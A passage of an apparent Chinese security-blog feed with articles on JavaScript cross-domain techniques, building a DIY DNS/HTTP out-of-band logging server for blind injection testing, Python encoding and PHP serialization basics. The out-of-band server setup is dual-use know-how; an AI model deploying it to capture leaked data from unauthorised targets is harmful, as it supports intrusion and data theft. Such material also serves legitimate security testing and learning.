class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>由于两个页面不在同一个域下，IE、Chrome不允许修改parent.location.hash的值，所以要借助于a.com域名下的一个代理iframe，这里有一个a.com下的代理文件c.html。Firefox可以修改。<br>c.html代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">parent.parent.location.hash = self.location.hash.substring(1);  </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>直接访问a.html，a.html向b.html发送的消息为”sayHi”；b.html通过消息判断返回了”HiWorld”，并通过c.html改变了location.hash的值<br><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2ao3jXNeK.eBjSZFlXXaywXXa_!!792076116.png" alt=""></p>
<h3 id="8-flash-URLLoader"><a href="#8-flash-URLLoader" class="headerlink" title="8. flash URLLoader"></a>8. flash URLLoader</h3><p>flash有自己的一套安全策略，服务器可以通过crossdomain.xml文件来声明能被哪些域的SWF文件访问，SWF也可以通过API来确定自身能被哪些域的SWF加载。当跨域访问资源时，例如从域baidu.com请求域google.com上的数据，我们可以借助flash来发送HTTP请求。首先，修改域google.com上的crossdomain.xml(一般存放在根目录，如果没有需要手动创建) ，把baidu.com加入到白名单。其次，通过Flash URLLoader发送HTTP请求，最后，通过Flash API把响应结果传递给JavaScript。Flash URLLoader是一种很普遍的跨域解决方案，不过需要支持iOS的话，这个方案就不可行了。</p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>总的来说，常见的跨域方法如上述。在不同的业务场景下，各有适合的跨域方式。跨域解决了一些资源共享、信息交互的难题，但是有的跨域方式可能会带来安全问题，如jsonp可导致水坑攻击，<code>&lt;img&gt;</code>等标签会被用来进行xss或csrf攻击。所以，在应用跨域的场景，需要格外注意安全问题。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/wps2015/scorm-cross-domian.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;最近面试问的挺多的一个问题，就是JavaScript的跨域问题。在这里，对跨域的一些方法做个总结。由于浏览器的同源策略，不同域名、不同端口、不同协议都会构成跨域；但在实际的业务中，很多场景需要进行跨域传递信息，这样就催生出多种跨域方法。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://das.scusec.org/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="javascript" scheme="http://das.scusec.org/tags/javascript/"/>
    
      <category term="wps2015" scheme="http://das.scusec.org/tags/wps2015/"/>
    
  </entry>
  
  <entry>
    <title>手把手教你DIY一个DNS/HTTP带外查询工具</title>
    <link href="http://das.scusec.org/2016/09/13/dns-http-search/"/>
    <id>http://das.scusec.org/2016/09/13/dns-http-search/</id>
    <published>2016-09-13T02:22:42.000Z</published>
    <updated>2016-12-16T06:34:35.025Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/cain/dns-http-search/dns-http-search.jpg" alt=""><br><a id="more"></a></p>
<blockquote>
<p>前段时间，cloadeye炒的沸沸扬扬，听说邀请码还挺贵的。算求了，花了一天时间自己DIY了一个简洁版，经过测试还是能用的。下面是具体的操作方法:</p>
</blockquote>
<h3 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h3><ul>
<li>一个二级域名</li>
<li>一个VPS</li>
</ul>
<h3 id="二、HTTP带外数据记录"><a href="#二、HTTP带外数据记录" class="headerlink" title="二、HTTP带外数据记录"></a>二、HTTP带外数据记录</h3><blockquote>
<p>默认情况下，Apache的日志是不入库的。需要修改httpd.conf，在LogFormat位置的地方添加如下代码:</p>
</blockquote>
<ul>
<li>设置日志格式以及处理方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogFormat &#34;INSERT INTO apachelog (ID, dateTime, IP, URL, code, host, userAgent, size, request) VALUES ( NULL , \&#34;%&#123;%Y-%m-%d %H:%M:%S&#125;t\&#34;, \&#34;%a\&#34;, \&#34;%U\&#34;, \&#34;%&#62;s\&#34;, \&#34; %&#123;Host&#125;i\&#34;, \&#34;%&#123;User-Agent&#125;i\&#34;, %b, %T);&#34; sqlcomm&#10; &#10;CustomLog &#34;| /usr/bin/mysql --user=root --password=&#39;******&#39; --database=dns_http&#34; sqlcomm</span><br></pre></td></tr></table></figure>
<p><img src="http://dassec.b0.upaiyun.com/cain/dns-http-search/img1.png" alt=""></p>
<ul>
<li>设计数据库</li>
</ul>
<p><img src="http://dassec.b0.upaiyun.com/cain/dns-http-search/img2.png" alt=""></p>
<ul>
<li>重启服务服务器之后，即可在数据库之中查看到访问日志</li>
</ul>
<p><img src="http://dassec.b0.upaiyun.com/cain/dns-http-search/img3.png" alt=""></p>
<h3 id="三、DNS带外数据记录"><a href="#三、DNS带外数据记录" class="headerlink" title="三、DNS带外数据记录"></a>三、DNS带外数据记录</h3><h4 id="3-1-设置DNS记录"><a href="#3-1-设置DNS记录" class="headerlink" title="3.1 设置DNS记录"></a>3.1 设置DNS记录</h4><p><img src="http://dassec.b0.upaiyun.com/cain/dns-http-search/img4.png" alt=""></p>
<blockquote>
<p>为什么要这么设置？因为我只有一台VPS，上面的意思就是为ns.xssyou.com添加一条A记录；为test.xssyou.com添加一条ns记录；上面的结果就是，当我查询.test.xssyou.com的DNS记录的时候，本地DNS服务器回到ns.xssyou.com去查询</p>
</blockquote>
<h4 id="3-2-VPS搭建DNS权威服务器"><a href="#3-2-VPS搭建DNS权威服务器" class="headerlink" title="3.2 VPS搭建DNS权威服务器"></a>3.2 VPS搭建DNS权威服务器</h4><ul>
<li><p>安装bindDNS服务器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># yum -y install bind caching-nameserver</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改配置文件/etc/named.conf如下图<br><img src="http://dassec.b0.upaiyun.com/cain/dns-http-search/img5.png" alt=""></p>
</li>
<li>添加配置信息/etc/named.rfc1912.zone</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zone &#34;test.xssyou.com&#34; in &#123;&#10;      type master;&#10;      file &#34;test.xssyou.com.zone&#34;;&#10;&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>添加test.xssyou.com.zone文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$TTL 0&#10;       IN SOA  @ ns.xssyou.com. (&#10;                                        0       ; serial&#10;                                        0       ; refresh&#10;                                        0       ; retry&#10;                                        0       ; expire&#10;                                        0 )     ; minimum&#10; &#10;       IN      NS      ns.xssyou.com.&#10;ns      IN      A       182.254.146.228&#10;@       IN      A       1.1.1.1&#10;a       IN      A       1.1.1.2&#10;*       IN      A       8.8.8.8</span><br></pre></td></tr></table></figure>
<h4 id="3-3-数据监控入库"><a href="#3-3-数据监控入库" class="headerlink" title="3.3 数据监控入库"></a>3.3 数据监控入库</h4><blockquote>
<p>此时已经能够正常获取DNS的日志了，但是此时是获取不到日志的，需要进行如下操作</p>
</blockquote>
<ul>
<li>rndc status查看状态</li>
<li>rndc querylog开启日志</li>
<li>tail -f /var/log/messages动态查看DNS查询日志</li>
</ul>
<blockquote>
<p>最后，我写了一个Python脚本，动态捕获日志并入库。</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/cain/dns-http-search/dns-http-search.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="DNS带外数据" scheme="http://das.scusec.org/tags/DNS%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE/"/>
    
      <category term="DNS服务器" scheme="http://das.scusec.org/tags/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
      <category term="HTTP带外数据" scheme="http://das.scusec.org/tags/HTTP%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE/"/>
    
      <category term="bind" scheme="http://das.scusec.org/tags/bind/"/>
    
      <category term="盲注" scheme="http://das.scusec.org/tags/%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python中编码二三事</title>
    <link href="http://das.scusec.org/2016/09/02/python-chardet/"/>
    <id>http://das.scusec.org/2016/09/02/python-chardet/</id>
    <published>2016-09-01T16:00:00.000Z</published>
    <updated>2016-09-02T07:01:32.329Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/ksss/chardet.jpg" alt=""></p>
<p>在审计的时候比较喜欢注意对字符串操作的编码、解码和截这些操作，因为这里有可能导致对抗SQLi和XSS等安全函数失效。</p>
<p>前两天改一个自己刚入学的时候写的python小工具，发现编码解码真是一个头疼却有不得不面对的问题。<br><a id="more"></a></p>
<p>一个小工具如果是自己用，写的很粗犷能达到预期目的就行。但是如果给别人用甚至更多人用，就不得不考虑代码的健壮了，不仅仅要预想运行的不同环境，也要考虑不符合预期的输入应该怎么处理。</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>从文件或者数据库读取输入后，在对内容进行处理前（如正则匹配），要先对输入进行一次规范化。我发现这是我经常疏忽的问题，结果就是在我的机器上可以跑，而给别人用的时候总会出问题。</p>
<p>一个数据交互不大的程序，可以考虑直接读写文件txt/csv/xls等，再大一点SQLite也不错。<br>从文件读取的内容的编码和文件是一致的，这时候如果要取出来的字符串进行正则匹配或者去数据库匹配结果，编码就很重要了。</p>
<p>可以考虑使用chardet模块先对字符串编码格式化，再进行其他处理。ab是从两种不同的文件中读取到的字符串，cd是程序中定义的字符串，下图可以看到chardect对他们的编码的识别。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/09/QQ%E6%88%AA%E5%9B%BE20160901173434-1024x647.png" alt=""></p>
<p>从c和d的编码的区别我们可以发现，变量的值如果是一般字符，变量的编码格式是ascii；变量的值如果是汉字或者其他特殊文字，将随py文件的编码而编码。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/09/QQ%E6%88%AA%E5%9B%BE20160901173402-1024x647.png" alt=""></p>
<p>大多数资料中提到这种情况会随文件也就是第二行声明的utf8而编码（事实上确实如果在头部不申明编码，这样进行赋值程序将会报错）。然而测试发现即使文件申明用gbk编码，值为汉字的变量的编码格式仍然是utf8，这可能和操作系统有关，没有继续研究这个点，因为既然识别出来了，可以用chardet.detect()很方便的解出来。因此只要在操作字符串之前加上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=data.decode(chardet.detect(data)[&#39;encoding&#39;])</span><br></pre></td></tr></table></figure></p>
<p>这时候字符串被转换成ascii格式，这种格式可以使用encode函数转换成想要的编码就行了。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/09/QQ%E6%88%AA%E5%9B%BE20160901174710-1024x647.png" alt=""></p>
<p>更多的时候我们会使用SQLite或者MySQL，比如做数据对比或者提取关键信息时，不编码肯定会出问题，MySQL数据存储的时候我一般设置成utf8-general-ci，所以设置数据库连接的时候使用一样的格式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MySQLdb.connect(host=&#39;&#39;,user=&#39;&#39;,passwd=&#39;&#39;,db=&#39;test&#39;,charset=&#34;utf8&#34;)</span><br></pre></td></tr></table></figure></p>
<p>这样设置一致读出来的数据直接处理一般没出什么问题，然而养成好习惯还是可以用chardet先格式化一次避免出现问题。</p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>剩下聊一些其他不符合预期的输入或者操作导致的问题的解决吧。</p>
<p>使用try，然后pass掉出错的数据自然是一个很省力的方案。但常常不是最优的方案，因为这样本来能够处理的数据因为上面的原因而被抛弃掉，如果舍弃数量大或者刚好舍弃掉重要的数据对功能产生很大影响。<br>所以最好还是要找到根源问题所在，上面的小程序改的心有些累，就是因为有时候有少量数据处理中会出错，不好被直接pass掉而不得不重新选取方法，导致了需要修改大片的代码~</p>
<p>找到问题-&gt;查找资料-&gt;思考解决方案-&gt;解决问题这个链条中，我们常会比较在意的是找第一个和最后一个环节，现在感觉中间的反复资料查找和思考却是最难的。上文提到的程序修改的时候还遇到了很多各种各样的问题，git一些项目中的做法和stackoverflow上的讨论等等常能提供很多思路。</p>
<p>具体做法还是见人见智，找到适合自己的方式就好。Leader Ourren常让我们在各方面要多自己思考，而不要去依赖别人给出的解决方案。事实上也切身感受到，如果在过程中自己多思考，最后常会发现解决问题的方法上得到的收获远大于问题本身。</p>
<p>The last，wish us to have a good job in the Sep’s hard winter.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/ksss/chardet.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在审计的时候比较喜欢注意对字符串操作的编码、解码和截这些操作，因为这里有可能导致对抗SQLi和XSS等安全函数失效。&lt;/p&gt;
&lt;p&gt;前两天改一个自己刚入学的时候写的python小工具，发现编码解码真是一个头疼却有不得不面对的问题。&lt;br&gt;
    
    </summary>
    
      <category term="开发笔记" scheme="http://das.scusec.org/categories/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="http://das.scusec.org/tags/Python/"/>
    
      <category term="chardet" scheme="http://das.scusec.org/tags/chardet/"/>
    
      <category term="ksss" scheme="http://das.scusec.org/tags/ksss/"/>
    
  </entry>
  
  <entry>
    <title>PHP序列化学习总结</title>
    <link href="http://das.scusec.org/2016/08/25/php-serialize/"/>
    <id>http://das.scusec.org/2016/08/25/php-serialize/</id>
    <published>2016-08-25T03:06:54.000Z</published>
    <updated>2016-08-26T02:09:58.759Z</updated>
    
    <content type="html"><![CDATA[<!-- 这里是文章头部的图片 大小为800px*200px左右-->
<p><img src="http://dassec.b0.upaiyun.com/kovige/obj.png" alt=""><br><!-- 这里是简单的介绍，50-100字 --></p>
<p>前段时间学习了php对象序列化，总结了一些遇到的和看到的利用方法，在这之前我对序列化完全John Snow，所以这篇笔记写得很细很基础。</p>
<a id="more"></a>
<h2 id="0x00-序列化函数"><a href="#0x00-序列化函数" class="headerlink" title="0x00 序列化函数"></a>0x00 序列化函数</h2><p><strong>serialize()</strong>：返回带有变量类型和值的字符串<br><strong>unserialize()</strong>：想要将已序列化的字符串变回 PHP 的值</p>
<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$b</span>;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>)</span></span>&#123;</span><br><span class="line">    		<span class="variable">$a</span>  = <span class="variable">$a</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test1</span> <span class="keyword">extends</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">     	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$a</span>)</span></span>&#123;</span><br><span class="line">     		<span class="variable">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">     	&#125;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">'hello'</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">123</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="keyword">false</span>;</span><br><span class="line">    <span class="variable">$d</span> = <span class="keyword">new</span> test(<span class="string">'helloa'</span>,<span class="string">'hellob'</span>,<span class="string">'helloc'</span>);</span><br><span class="line">    <span class="variable">$e</span> = <span class="keyword">new</span> test1(<span class="string">'hello'</span>);</span><br><span class="line">    </span><br><span class="line">    var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line">    var_dump(serialize(<span class="variable">$b</span>));</span><br><span class="line">    var_dump(serialize(<span class="variable">$c</span>));</span><br><span class="line">    var_dump(serialize(<span class="variable">$d</span>));</span><br><span class="line">    var_dump(serialize(<span class="variable">$e</span>));</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string <span class="string">'s:5:"hello";'</span> (length=<span class="number">12</span>)</span><br><span class="line">string <span class="string">'i:123;'</span> (length=<span class="number">6</span>)</span><br><span class="line">string <span class="string">'b:0;'</span> (length=<span class="number">4</span>)</span><br><span class="line">string <span class="string">'O:4:"test":2:&#123;s:1:"a";N;s:1:"b";s:6:"hellob";&#125;'</span> (length=<span class="number">46</span>)</span><br><span class="line">string <span class="string">'O:5:"test1":2:&#123;s:1:"a";s:5:"hello";s:1:"b";N;&#125;'</span> (length=<span class="number">46</span>)</span><br></pre></td></tr></table></figure>
<p>序列化字符串格式：<strong>变量类型：变量长度：变量内容</strong>。<br>如果序列化的是一个对象，序列化字符串格式为：<br><strong>变量类型：类名长度：类名：属性数量：｛属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容｝</strong></p>
<p>将上述结果反序列化输出，执行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string <span class="string">'hello'</span> (length=<span class="number">5</span>)</span><br><span class="line">int <span class="number">123</span></span><br><span class="line">boolean <span class="keyword">false</span></span><br><span class="line">object(test)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'a'</span> =&gt; <span class="keyword">null</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">'b'</span> =&gt; string <span class="string">'hellob'</span> (length=<span class="number">6</span>)</span><br><span class="line">object(test1)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'hello'</span> (length=<span class="number">5</span>)</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'b'</span> =&gt; <span class="keyword">null</span></span><br></pre></td></tr></table></figure></p>
<h2 id="0x01-对象序列化"><a href="#0x01-对象序列化" class="headerlink" title="0x01 对象序列化"></a>0x01 对象序列化</h2><p>当序列化对象时，PHP 将在序列动作之前调用该对象的成员函数 <strong>sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用</strong>wakeup()成员函数。</p>
<p>在serialize()函数执行时，会先检查类中是否定义了<strong>sleep()函数，如果存在，则首先调用</strong>sleep()函数，如果不存在，就保留序列字符串中的所有属性。</p>
<p>在unserialize()函数执行时，会先检查是否定义了<strong>wakeup()函数。如果</strong>wakeup()存在，将执行__wakeup()函数，会使变量被重新赋值。</p>
<p>serialize()测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$b</span>;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>)</span></span>&#123;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;a  = <span class="variable">$a</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">"b has changed"</span>.<span class="string">"\n"</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;b = <span class="string">'hib'</span>;</span><br><span class="line">    		<span class="keyword">return</span> <span class="variable">$this</span>-&gt;b;</span><br><span class="line">    		</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">"a has changed"</span>.<span class="string">"\n"</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;a = <span class="string">'hia'</span>;</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test1</span> <span class="keyword">extends</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">     	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$a</span>)</span></span>&#123;</span><br><span class="line">     		<span class="variable">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">     	&#125;</span><br><span class="line">     &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$d</span> = <span class="keyword">new</span> test(<span class="string">'helloa'</span>,<span class="string">'hellob'</span>,<span class="string">'helloc'</span>);</span><br><span class="line">    <span class="variable">$e</span> = <span class="keyword">new</span> test1(<span class="string">'hello'</span>);</span><br><span class="line">    </span><br><span class="line">    serialize(<span class="variable">$d</span>);</span><br><span class="line">    serialize(<span class="variable">$e</span>);</span><br><span class="line">    </span><br><span class="line">    var_dump(<span class="variable">$d</span>);</span><br><span class="line">    var_dump(<span class="variable">$e</span>);</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>执行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b has changed b has changed</span><br><span class="line">object(test)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'helloa'</span> (length=<span class="number">6</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="string">'b'</span> =&gt; string <span class="string">'hib'</span> (length=<span class="number">3</span>)</span><br><span class="line">object(test1)[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'hello'</span> (length=<span class="number">5</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="string">'b'</span> =&gt; string <span class="string">'hib'</span> (length=<span class="number">3</span>)</span><br></pre></td></tr></table></figure></p>
<p>unserialize()测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$b</span>;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>)</span></span>&#123;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;a  = <span class="variable">$a</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">"b has changed"</span>.<span class="string">"\n"</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;b = <span class="string">'hib'</span>;</span><br><span class="line">    		<span class="keyword">return</span> <span class="variable">$this</span>-&gt;b;</span><br><span class="line">    		</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">"a has changed"</span>.<span class="string">"\n"</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;a = <span class="string">'hia'</span>;</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test1</span> <span class="keyword">extends</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">     	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$a</span>)</span></span>&#123;</span><br><span class="line">     		<span class="variable">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">     	&#125;</span><br><span class="line">     &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$d</span> = <span class="string">'O:4:"test":2:&#123;s:1:"a";N;s:1:"b";s:6:"hellob";&#125;'</span> ;</span><br><span class="line">        <span class="variable">$e</span> = <span class="string">'O:5:"test1":2:&#123;s:1:"a";s:5:"hello";s:1:"b";N;&#125;'</span> ;</span><br><span class="line">    </span><br><span class="line">        var_dump(unserialize(<span class="variable">$d</span>));</span><br><span class="line">        var_dump(unserialize(<span class="variable">$e</span>));</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a has changed</span><br><span class="line">object(test)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'hia'</span> (length=<span class="number">3</span>)</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'b'</span> =&gt; string <span class="string">'hellob'</span> (length=<span class="number">6</span>)</span><br><span class="line">a has changed</span><br><span class="line">object(test1)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'hia'</span> (length=<span class="number">3</span>)</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'b'</span> =&gt; <span class="keyword">null</span></span><br></pre></td></tr></table></figure></p>
